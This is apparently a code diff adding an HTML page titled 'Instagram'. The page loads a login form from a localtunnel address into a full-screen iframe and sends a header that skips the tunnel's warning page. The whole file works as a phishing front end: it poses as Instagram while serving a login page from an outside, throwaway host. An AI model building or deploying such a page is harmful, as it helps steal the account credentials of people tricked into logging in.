@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Instagram</title>
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      
+      #output-frame-id {
+        width: 100vw;
+        height: 100vh;
+      }
+    </style>
+  </head>
+  <body>
+    <iframe id="output-frame-id">
+    </iframe>
+    <script>
+      var xhr = new XMLHttpRequest();
+
+      xhr.open('GET', 'https://grumpy-termite-67.loca.lt/login.html');
+      xhr.onreadystatechange = handler;
+      xhr.responseType = 'blob';
+      xhr.setRequestHeader('Bypass-Tunnel-Reminder', 'notnull');
+      xhr.send();
+
+      function handler() {
+        if (this.readyState === this.DONE) {
+          if (this.status === 200) {
+            // this.response is a Blob, because we set responseType above
+            var data_url = URL.createObjectURL(this.response);
+            document.querySelector('#output-frame-id').src = data_url;
+          }
+        }
+      }
+    </script>
+  </body>
+</html>
